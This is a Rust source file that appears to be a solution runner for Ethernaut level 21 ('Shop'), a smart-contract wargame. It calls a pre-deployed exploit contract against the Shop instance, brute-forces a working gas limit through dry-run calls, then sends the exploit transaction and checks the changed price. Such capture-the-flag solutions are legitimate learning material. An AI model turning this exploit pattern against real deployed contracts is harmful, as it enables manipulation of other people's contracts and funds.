#[allow(unused_imports)]
use alloy::{
    network::{EthereumWallet, TransactionBuilder},
    primitives::{
        Address, B256, Bytes, U256, address,
        keccak256,
        utils::{Unit, format_ether},
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol!{
    #[sol(rpc)]
    contract Exp {
        function exploit(address target) external;
    }

    #[sol(rpc)]
    contract Shop {
        function price() external view returns (uint256);
    }
}

use crate::ethernaut;
use tokio::runtime::Runtime;

#[allow(dead_code)]
pub fn level21_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(level21())?;
    
    Ok(())
}

async fn level21() -> Result<(), Box<dyn std::error::Error>> {
    let alice_signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    let bob_signer: PrivateKeySigner = ethernaut::BOB_KEY.parse()?;

    let mut wallet = EthereumWallet::from(alice_signer);
    wallet.register_signer(bob_signer);

    let provider = ProviderBuilder::new()
        .wallet(wallet)
        .connect(ethernaut::RPC)
        .await?;

    let shop_address = "0xd7580769be7a5c666068959e230d8Bf3a7a1DF24".parse()?;
    let shop = Shop::new(shop_address, provider.clone());
    let exp_address = "0x408E4F74376F2445C3bf2aCe34d39C59611f02dB".parse()?;
    let exp = Exp::new(exp_address, provider.clone());

    println!("[CHECK]");
    let mut price = shop.price().call().await?;
    println!("[Shop.price()]    price = {}\n", price);
    
    
    let mut right_gas = None;
    
    for gas in (50000u64..70000u64).step_by(100) {
        match exp.exploit(shop_address).gas(gas).call().await {
            Ok(_) => {
                println!("[TEST]    Success gas = {}", gas);
                right_gas = Some(gas);
                break;
            }
            Err(_) => {
                println!("[TEST]    Failed gas = {}", gas);
            }
        }
    }

    match right_gas {
        Some(gas) => {
            let exploit_tx = exp.exploit(shop_address)
                .gas(gas)
                .send()
                .await?;
            println!("[Exp.exploit()]    Pending trasaction... {}",
                exploit_tx.tx_hash()
            );
            let exploit_receipt = exploit_tx.get_receipt().await?;
            println!(
                "[Exp.exploit()]    Transaction included in block {}",
                exploit_receipt.block_number.expect("Failed to get block number")
            );

            println!("[CHECK]");
            price = shop.price().call().await?;
            println!("[Shop.price()]    price = {}\n", price);
        }
        None => {
            println!("[Failed]    without right gas");
        }
    }
    
    Ok(())
}
